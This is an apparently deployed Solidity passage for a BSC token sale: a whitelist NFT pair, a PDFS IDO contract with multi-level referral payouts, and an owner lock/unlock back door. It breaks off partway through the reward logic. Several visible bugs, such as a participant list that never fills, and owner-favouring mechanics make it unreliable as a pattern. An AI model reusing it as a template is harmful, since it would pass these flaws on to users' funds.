/**
 *Submitted for verification at BscScan.com on 2022-04-18
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        _previousOwner = _owner;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }

    function unlock() public virtual {
        require(
            _previousOwner == msg.sender,
            "You don't have permission to unlock"
        );
        require(block.timestamp > _lockTime, "Contract is locked until 0 days");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC165 {
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

abstract contract ERC165 is IERC165 {
    function supportsInterface(bytes4 interfaceId)
        public
        view
        virtual
        override
        returns (bool)
    {
        return interfaceId == type(IERC165).interfaceId;
    }
}

interface IERC721 is IERC165 {
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 indexed tokenId
    );
    event Approval(
        address indexed owner,
        address indexed approved,
        uint256 indexed tokenId
    );
    event ApprovalForAll(
        address indexed owner,
        address indexed operator,
        bool approved
    );

    function balanceOf(address owner) external view returns (uint256 balance);

    function ownerOf(uint256 tokenId) external view returns (address owner);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function approve(address to, uint256 tokenId) external;

    function getApproved(uint256 tokenId)
        external
        view
        returns (address operator);

    function setApprovalForAll(address operator, bool _approved) external;

    function isApprovedForAll(address owner, address operator)
        external
        view
        returns (bool);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;
}

interface IERC721Metadata is IERC721 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function tokenURI(uint256 tokenId) external view returns (string memory);
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(uint256 value, uint256 length)
        internal
        pure
        returns (string memory)
    {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract ERC721 is Context, ERC165, IERC721, IERC721Metadata {
    using Address for address;
    using Strings for uint256;
    string private _baseURI;

    string private _name;
    string private _symbol;

    mapping(uint256 => address) private _owners;
    mapping(address => uint256) private _balances;
    mapping(uint256 => address) private _tokenApprovals;
    mapping(address => mapping(address => bool)) private _operatorApprovals;

    constructor(
        string memory name_,
        string memory symbol_,
        string memory baseURI_
    ) {
        _name = name_;
        _symbol = symbol_;
        _setBaseURI(baseURI_);
    }

    function _setBaseURI(string memory baseURI_) internal virtual {
        _baseURI = baseURI_;
    }

    function supportsInterface(bytes4 interfaceId)
        public
        view
        virtual
        override(ERC165, IERC165)
        returns (bool)
    {
        return
            interfaceId == type(IERC721).interfaceId ||
            interfaceId == type(IERC721Metadata).interfaceId ||
            super.supportsInterface(interfaceId);
    }

    function balanceOf(address owner)
        public
        view
        virtual
        override
        returns (uint256)
    {
        require(
            owner != address(0),
            "ERC721: balance query for the zero address"
        );
        return _balances[owner];
    }

    function ownerOf(uint256 tokenId)
        public
        view
        virtual
        override
        returns (address)
    {
        address owner = _owners[tokenId];
        require(
            owner != address(0),
            "ERC721: owner query for nonexistent token"
        );
        return owner;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function tokenURI(uint256 tokenId)
        public
        view
        virtual
        override
        returns (string memory)
    {
        require(
            _exists(tokenId),
            "ERC721Metadata: URI query for nonexistent token"
        );
        return
            bytes(_baseURI).length > 0
                ? string(abi.encodePacked(_baseURI, tokenId.toString()))
                : "";
    }

    function baseURI() internal view virtual returns (string memory) {
        return _baseURI;
    }

    function approve(address to, uint256 tokenId) public virtual override {
        address owner = ERC721.ownerOf(tokenId);
        require(to != owner, "ERC721: approval to current owner");

        require(
            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
            "ERC721: approve caller is not owner nor approved for all"
        );

        _approve(to, tokenId);
    }

    function getApproved(uint256 tokenId)
        public
        view
        virtual
        override
        returns (address)
    {
        require(
            _exists(tokenId),
            "ERC721: approved query for nonexistent token"
        );

        return _tokenApprovals[tokenId];
    }

    function setApprovalForAll(address operator, bool approved)
        public
        virtual
        override
    {
        _setApprovalForAll(_msgSender(), operator, approved);
    }

    function isApprovedForAll(address owner, address operator)
        public
        view
        virtual
        override
        returns (bool)
    {
        return _operatorApprovals[owner][operator];
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public virtual override {
        //solhint-disable-next-line max-line-length
        require(
            _isApprovedOrOwner(_msgSender(), tokenId),
            "ERC721: transfer caller is not owner nor approved"
        );

        _transfer(from, to, tokenId);
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public virtual override {
        safeTransferFrom(from, to, tokenId, "");
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) public virtual override {
        require(
            _isApprovedOrOwner(_msgSender(), tokenId),
            "ERC721: transfer caller is not owner nor approved"
        );
        _safeTransfer(from, to, tokenId, _data);
    }

    function _safeTransfer(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _transfer(from, to, tokenId);
        require(
            _checkOnERC721Received(from, to, tokenId, _data),
            "ERC721: transfer to non ERC721Receiver implementer"
        );
    }

    function _exists(uint256 tokenId) internal view virtual returns (bool) {
        return _owners[tokenId] != address(0);
    }

    function _isApprovedOrOwner(address spender, uint256 tokenId)
        internal
        view
        virtual
        returns (bool)
    {
        require(
            _exists(tokenId),
            "ERC721: operator query for nonexistent token"
        );
        address owner = ERC721.ownerOf(tokenId);
        return (spender == owner ||
            getApproved(tokenId) == spender ||
            isApprovedForAll(owner, spender));
    }

    function _safeMint(address to, uint256 tokenId) internal virtual {
        _safeMint(to, tokenId, "");
    }

    function _safeMint(
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _mint(to, tokenId);
        require(
            _checkOnERC721Received(address(0), to, tokenId, _data),
            "ERC721: transfer to non ERC721Receiver implementer"
        );
    }

    function _mint(address to, uint256 tokenId) internal virtual {
        require(to != address(0), "ERC721: mint to the zero address");
        require(!_exists(tokenId), "ERC721: token already minted");

        _beforeTokenTransfer(address(0), to, tokenId);

        _balances[to] += 1;
        _owners[tokenId] = to;

        emit Transfer(address(0), to, tokenId);

        _afterTokenTransfer(address(0), to, tokenId);
    }

    function _burn(uint256 tokenId) internal virtual {
        address owner = ERC721.ownerOf(tokenId);

        _beforeTokenTransfer(owner, address(0), tokenId);

        // Clear approvals
        _approve(address(0), tokenId);

        _balances[owner] -= 1;
        delete _owners[tokenId];

        emit Transfer(owner, address(0), tokenId);

        _afterTokenTransfer(owner, address(0), tokenId);
    }

    function _transfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {
        require(
            ERC721.ownerOf(tokenId) == from,
            "ERC721: transfer from incorrect owner"
        );
        require(to != address(0), "ERC721: transfer to the zero address");

        _beforeTokenTransfer(from, to, tokenId);

        // Clear approvals from the previous owner
        _approve(address(0), tokenId);

        _balances[from] -= 1;
        _balances[to] += 1;
        _owners[tokenId] = to;

        emit Transfer(from, to, tokenId);

        _afterTokenTransfer(from, to, tokenId);
    }

    function _approve(address to, uint256 tokenId) internal virtual {
        _tokenApprovals[tokenId] = to;
        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);
    }

    function _setApprovalForAll(
        address owner,
        address operator,
        bool approved
    ) internal virtual {
        require(owner != operator, "ERC721: approve to caller");
        _operatorApprovals[owner][operator] = approved;
        emit ApprovalForAll(owner, operator, approved);
    }

    function _checkOnERC721Received(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) private returns (bool) {
        if (to.isContract()) {
            try
                IERC721Receiver(to).onERC721Received(
                    _msgSender(),
                    from,
                    tokenId,
                    _data
                )
            returns (bytes4 retval) {
                return retval == IERC721Receiver.onERC721Received.selector;
            } catch (bytes memory reason) {
                if (reason.length == 0) {
                    revert(
                        "ERC721: transfer to non ERC721Receiver implementer"
                    );
                } else {
                    assembly {
                        revert(add(32, reason), mload(reason))
                    }
                }
            }
        } else {
            return true;
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual {}
}

interface IERC721Enumerable is IERC721 {
    function totalSupply() external view returns (uint256);

    function tokenOfOwnerByIndex(address owner, uint256 index)
        external
        view
        returns (uint256 tokenId);

    function tokenByIndex(uint256 index) external view returns (uint256);
}

abstract contract ERC721Enumerable is ERC721, IERC721Enumerable {
    mapping(address => mapping(uint256 => uint256)) private _ownedTokens;
    mapping(uint256 => uint256) private _ownedTokensIndex;
    uint256[] private _allTokens;
    mapping(uint256 => uint256) private _allTokensIndex;

    function supportsInterface(bytes4 interfaceId)
        public
        view
        virtual
        override(IERC165, ERC721)
        returns (bool)
    {
        return
            interfaceId == type(IERC721Enumerable).interfaceId ||
            super.supportsInterface(interfaceId);
    }

    function tokenOfOwnerByIndex(address owner, uint256 index)
        public
        view
        virtual
        override
        returns (uint256)
    {
        require(
            index < ERC721.balanceOf(owner),
            "ERC721Enumerable: owner index out of bounds"
        );
        return _ownedTokens[owner][index];
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _allTokens.length;
    }

    function tokenByIndex(uint256 index)
        public
        view
        virtual
        override
        returns (uint256)
    {
        require(
            index < ERC721Enumerable.totalSupply(),
            "ERC721Enumerable: global index out of bounds"
        );
        return _allTokens[index];
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 tokenId
    ) internal virtual override {
        super._beforeTokenTransfer(from, to, tokenId);

        if (from == address(0)) {
            _addTokenToAllTokensEnumeration(tokenId);
        } else if (from != to) {
            _removeTokenFromOwnerEnumeration(from, tokenId);
        }
        if (to == address(0)) {
            _removeTokenFromAllTokensEnumeration(tokenId);
        } else if (to != from) {
            _addTokenToOwnerEnumeration(to, tokenId);
        }
    }

    function _addTokenToOwnerEnumeration(address to, uint256 tokenId) private {
        uint256 length = ERC721.balanceOf(to);
        _ownedTokens[to][length] = tokenId;
        _ownedTokensIndex[tokenId] = length;
    }

    function _addTokenToAllTokensEnumeration(uint256 tokenId) private {
        _allTokensIndex[tokenId] = _allTokens.length;
        _allTokens.push(tokenId);
    }

    function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId)
        private
    {
        uint256 lastTokenIndex = ERC721.balanceOf(from) - 1;
        uint256 tokenIndex = _ownedTokensIndex[tokenId];

        if (tokenIndex != lastTokenIndex) {
            uint256 lastTokenId = _ownedTokens[from][lastTokenIndex];

            _ownedTokens[from][tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token
            _ownedTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index
        }

        delete _ownedTokensIndex[tokenId];
        delete _ownedTokens[from][lastTokenIndex];
    }

    function _removeTokenFromAllTokensEnumeration(uint256 tokenId) private {
        uint256 lastTokenIndex = _allTokens.length - 1;
        uint256 tokenIndex = _allTokensIndex[tokenId];

        uint256 lastTokenId = _allTokens[lastTokenIndex];

        _allTokens[tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token
        _allTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index

        delete _allTokensIndex[tokenId];
        _allTokens.pop();
    }
}

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

contract DiffusionOne is ERC721Enumerable, ReentrancyGuard, Ownable {
    using SafeMath for uint256;

    PDFS public pdfs;

    constructor() ERC721("DiffusionOne", "DiffusionOne", "") Ownable() {}

    function getPDFS() public view returns (address) {
        return address(pdfs);
    }

    function setPDFS(PDFS _pdfs) public onlyOwner {
        pdfs = _pdfs;
    }

    function casting() public payable {
        require(pdfs.isWhiteList(msg.sender), "Not in whitelist");
        require(balanceOf(msg.sender) == 0, "already casted");
        _mint(msg.sender, totalSupply());
    }
}

contract DiffusionTwo is ERC721Enumerable, ReentrancyGuard, Ownable {
    using SafeMath for uint256;
    PDFS public pdfs;
    DiffusionOne public one;

    mapping(address => address) public referral;

    constructor() ERC721("DiffusionTwo", "DiffusionTwo", "") Ownable() {}

    function getPDFS() public view returns (address) {
        return address(pdfs);
    }

    function setOne(DiffusionOne _one) public onlyOwner {
        one = _one;
    }

    function setPDFS(PDFS _pdfs) public onlyOwner {
        pdfs = _pdfs;
    }

    function casting(address _leader) public payable {
        require(pdfs.isWhiteList(_leader), "Not in whitelist");
        require(balanceOf(msg.sender) == 0, "already casted");
        require(_leader != msg.sender, "cannot set yourself as leader");
        require(one.balanceOf(_leader) == 1, "Referral not casted One");
        referral[msg.sender] = _leader;
        _mint(msg.sender, totalSupply());
    }
}

library FixedPoint {
    struct uq112x112 {
        uint224 _x;
    }

    struct uq144x112 {
        uint256 _x;
    }

    uint8 private constant RESOLUTION = 112;
    uint256 private constant Q112 = 0x10000000000000000000000000000;
    uint256 private constant Q224 =
        0x100000000000000000000000000000000000000000000000000000000;
    uint256 private constant LOWER_MASK = 0xffffffffffffffffffffffffffff; // decimal of UQ*x112 (lower 112 bits)

    function fullMul(uint256 x, uint256 y)
        private
        pure
        returns (uint256 l, uint256 h)
    {
        uint256 mm = mulmod(x, y, uint256(0) - 1);
        l = x * y;
        h = mm - l;
        if (mm < l) h -= 1;
    }

    function mulDiv(
        uint256 x,
        uint256 y,
        uint256 z
    ) public pure returns (uint256) {
        (uint256 l, uint256 h) = fullMul(x, y);
        require(h < z);

        uint256 mm = mulmod(x, y, z);
        if (mm > l) h -= 1;
        l -= mm;

        uint256 pow2 = z & (~z + 1);
        z /= pow2;
        l /= pow2;
        l += h * ((~pow2 + 1) / pow2 + 1);

        uint256 r = 1;
        r *= 2 - z * r;
        r *= 2 - z * r;
        r *= 2 - z * r;
        r *= 2 - z * r;
        r *= 2 - z * r;
        r *= 2 - z * r;
        r *= 2 - z * r;
        r *= 2 - z * r;

        return l * r;
    }

    function decode(uq112x112 memory self) internal pure returns (uint112) {
        return uint112(self._x >> RESOLUTION);
    }

    function decode112with18(uq112x112 memory self)
        internal
        pure
        returns (uint256)
    {
        return uint256(self._x) / 5192296858534827;
    }

    function fraction(uint256 numerator, uint256 denominator)
        internal
        pure
        returns (uq112x112 memory)
    {
        require(denominator > 0, "FixedPoint::fraction: division by zero");
        if (numerator == 0) return FixedPoint.uq112x112(0);

        if (numerator <= (uint144(0) - 1)) {
            uint256 result = (numerator << RESOLUTION) / denominator;
            require(
                result <= (uint224(0) - 1),
                "FixedPoint::fraction: overflow"
            );
            return uq112x112(uint224(result));
        } else {
            uint256 result = mulDiv(numerator, Q112, denominator);
            require(
                result <= (uint224(0) - 1),
                "FixedPoint::fraction: overflow"
            );
            return uq112x112(uint224(result));
        }
    }
}
struct ReleaseInfo {
    uint256 balance;
    uint256 lastTime;
}

struct Fraction {
    uint256 quotient;
    uint256 remainder;
    string result;
}

contract PDFS is Context, Ownable {
    using SafeMath for uint256;
    using FixedPoint for *;

    Fraction private fractionPrice;
    uint256 public totalSupply;
    mapping(address => uint256) public balances;
    mapping(address => ReleaseInfo) public releaseInfo;

    mapping(address => uint256) public IDOBalance;
    uint256 public IDOTotal;
    // address usdtAddress = 0x55d398326f99059fF775485246999027B3197955; // mainnet
    address public usdtAddress = 0xc362B3ed5039447dB7a06F0a3d0bd9238E74d57c; // testnet
    address public reciever = 0xFFb23C0d440e95A5dE323B38ec9b5CEd1Dd8489e; // mainnet
    address public marketAddress = 0x9b9931fA3Ff29A65664636D64eb8F28B09e515D2;
    DiffusionOne public one;
    DiffusionTwo public two;

    address public mainnetAddress;
    uint256 public releaseStart;
    uint256 public releaseEnd;

    event AttendIDO(address addre, uint256 amount, uint256 time);

    address[] public participants;
    address[] public whitelist;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Approval(address indexed src, address indexed guy, uint256 wad);
    event Transfer(address indexed src, address indexed dst, uint256 wad);
    event Deposit(address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);

    constructor(DiffusionOne _one, DiffusionTwo _two) {
        _mint(address(this), 2**255 - 1);
        one = _one;
        two = _two;
    }

    receive() external payable {
        deposit();
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        _mint(msg.sender, msg.value.div(2));
        IDOTotal = IDOTotal.add(msg.value);
        IDOBalance[msg.sender] = IDOBalance[msg.sender].add(msg.value);
        if (IDOBalance[msg.sender] == 0) {
            participants.push(msg.sender);
        }
        emit AttendIDO(msg.sender, msg.value, block.timestamp);
    }

    function withdraw(uint256 wad) public {
        require(balanceOf[msg.sender] >= wad, "Not enough balance");
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function approve(address guy, uint256 wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        totalSupply = totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
    }

    function startMainnet() public onlyOwner {
        releaseStart = block.timestamp;
    }

    function burn() public {
        require(releaseStart != 0, "mainnet not start yet");
        require(
            releaseEnd > releaseStart,
            "release end time must be greater than mainnet start time"
        );
        uint256 amountPerSecond = balances[msg.sender].div(
            releaseEnd.sub(releaseStart)
        );
        ReleaseInfo storage info = releaseInfo[msg.sender];
        if (info.lastTime == 0) {
            info.lastTime = releaseStart;
        }
        uint256 accAmount = amountPerSecond.mul(
            block.timestamp - info.lastTime
        );
        balances[msg.sender] = balances[msg.sender].sub(
            accAmount,
            "ERC20: burn amount exceeds balance"
        );
        totalSupply = totalSupply.sub(accAmount);
        info.balance = info.balance.add(accAmount);
        info.lastTime = block.timestamp;
    }

    function setIDONFTAddress(DiffusionOne _one, DiffusionTwo _two)
        public
        onlyOwner
    {
        one = _one;
        two = _two;
    }

    function isWhiteList(address _addr) public view returns (bool) {
        for (uint256 i = 0; i < whitelist.length; i++) {
            if (_addr == whitelist[i]) {
                return true;
            }
        }
        return false;
    }

    function addWhiteList(address[] memory _addr) public onlyOwner {
        for (uint256 i = 0; i < _addr.length; i++) {
            if (!isWhiteList(_addr[i])) {
                whitelist.push(_addr[i]);
            }
        }
    }

    function setReleaseEnd(uint256 _end) public onlyOwner {
        releaseEnd = _end;
    }

    function getParticipants()
        public
        view
        onlyOwner
        returns (address[] memory)
    {
        return participants;
    }

    function getParticipantsLen() public view returns (uint256) {
        return participants.length;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function getIDOBalance(address _addr) public view returns (uint256) {
        return IDOBalance[_addr];
    }

    function getIDOTotal() external view returns (uint256) {
        return IDOTotal;
    }

    function transfer(address dst, uint256 wad) public returns (bool) {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        balanceOf[dst] += wad;
        emit Transfer(msg.sender, dst, wad);
        return true;
    }

    function between(address addr, uint256 amount) public view {
        uint256 decimal = IERC20(usdtAddress).decimals();
        uint256 low = 1000;
        uint256 high = 10000;
        uint256 power = 10**decimal;
        require(
            low.mul(power) <= IDOBalance[addr].add(amount),
            "whitelist user has to buy 1000 at least"
        );
        require(
            IDOBalance[addr].add(amount) <= high.mul(power),
            "whitelist user can buy 10000 at most"
        );
    }

    function division(
        uint256 decimalPlaces,
        uint256 numerator,
        uint256 denominator
    )
        public
        pure
        returns (
            uint256 quotient,
            uint256 remainder,
            string memory result
        )
    {
        uint256 factor = 10**decimalPlaces;
        quotient = numerator / denominator;
        remainder = ((numerator * factor) / denominator) % factor;
        result = string(
            abi.encodePacked(
                Strings.toString(quotient),
                ".",
                Strings.toString(remainder)
            )
        );
    }

    function getPrice() public view returns (uint256) {
        uint256 price = 20;
        uint256 increament = IDOTotal.div(200000 * 1e18);
        return price.add(increament);
    }

    function acceptable(address _referral, uint256 amount) internal {
        require(msg.sender != _referral, "Cannot set yourself as referral");
        uint256 hundred = 100;
        uint256 power = 10**IERC20(usdtAddress).decimals();
        uint256 price = 20;
        uint256 increament = IDOTotal.div(200000 * 1e18);
        uint256 pdfsAmount = amount.div(price.add(increament)).mul(10);
        if (one.balanceOf(msg.sender) == 1) {
            between(msg.sender, amount);
            IERC20(usdtAddress).transferFrom(msg.sender, reciever, amount);
            _mint(msg.sender, pdfsAmount);
        } else if (
            (_referral != address(0) &&
                ((one.balanceOf(_referral) == 1 ||
                    two.balanceOf(_referral) == 1) ||
                    two.balanceOf(msg.sender) == 1))
        ) {
            between(msg.sender, amount);
            IERC20(usdtAddress).transferFrom(msg.sender, address(this), amount);
            _mint(msg.sender, pdfsAmount);
        } else {
            require(
                IDOBalance[msg.sender].add(amount) <= hundred.mul(power),
                "Doesn't have a whitelist limits to 100"
            );
            IERC20(usdtAddress).transferFrom(msg.sender, reciever, amount);
            _mint(msg.sender, pdfsAmount);
        }
    }

    function rewardIDO(address _referral, uint256 amount) internal {
        uint256 price = 20;
        uint256 increament = IDOTotal.div(200000 * 1e18);
        uint256 pdfsAmount = amount.div(price.add(increament)).mul(10);
        uint256 reward = 0;
        uint256 ido = amount;
        if (_referral != address(0)) {
            if (
                (one.balanceOf(_referral) == 1 ||
                    two.balanceOf(msg.sender) == 1) &&
                IDOBalance[_referral] >= 5000 * 1e18
            ) {
                reward = amount.mul(5).div(100);
                ido = amount.mul(95).div(100);
                IERC20(usdtAddress).transfer(_referral, reward);
                IERC20(usdtAddress).transfer(reciever, ido);
                _mint(_referral, pdfsAmount.mul(5).div(100));
            }

            reward = amount.mul(25).div(1000);
            if (two.balanceOf(_referral) == 1) {
                if (
                    IDOBalance[_referral] >= 5000 * 1e18 &&
                    IDOBalance[two.referral(_referral)] >= 5000 * 1e18
                ) {
                    ido = amount.mul(95).div(100);
                    IERC20(usdtAddress).transfer(reciever, ido);

                    IERC20(usdtAddress).transfer(_referral, reward);
                    _mint(_referral, pdfsAmount.mul(25).div(1000));

                    IERC20(usdtAddress).transfer(
                        two.referral(_referral),
                        reward
                    );
                    _mint(
                        two.referral(_referral),
                        pdfsAmount.mul(25).div(1000)
                    );
                } else if (
                    IDOBalance[_referral] >= 5000 * 1e18 &&
                    IDOBalance[two.referral(_referral)] < 5000 * 1e18
                ) {
                    ido = amount.mul(975).div(1000);
                    IERC20(usdtAddress).transfer(reciever, ido);
                    IERC20(usdtAddress).transfer(_referral, reward);
                    _mint(_referral, pdfsAmount.mul(25).div(1000));
                } else if (
                    IDOBalance[_referral] < 5000 * 1e18 &&
                    IDOBalance[two.referral(_referral)] > 5000 * 1e18
                ) {
                    ido = amount.mul(975).div(1000);
